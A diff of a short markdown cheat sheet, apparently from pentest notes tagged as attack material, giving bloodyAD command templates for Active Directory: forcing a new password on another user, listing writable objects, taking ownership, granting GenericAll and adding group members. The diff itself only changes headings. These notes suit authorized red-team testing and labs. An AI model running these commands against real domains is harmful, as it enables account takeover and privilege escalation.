@@ -1,12 +1,12 @@
 # bloodyad
 #plateform/linux #target/remote #cat/ATTACK
 
-## Set password
+## change password / set password
 ```
 bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set password '<target_user>' '<new_passwd|Password123!>'
 ```
 
-## Get writable
+## Get writable 
 ```
 bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' get writable
 ```
@@ -16,12 +16,12 @@ bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' get writable
 bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set owner '<target_obj>' '<our_acc>'
 ```
 
-## Add GenericAll
+## Add GenericAll 
 ```
 bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add genericAll '<target_obj>' '<our_acc>'
 ```
 
-## Add group member
+## Add group member 
 ```
 bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add groupMember '<group>' '<member>'
 ```
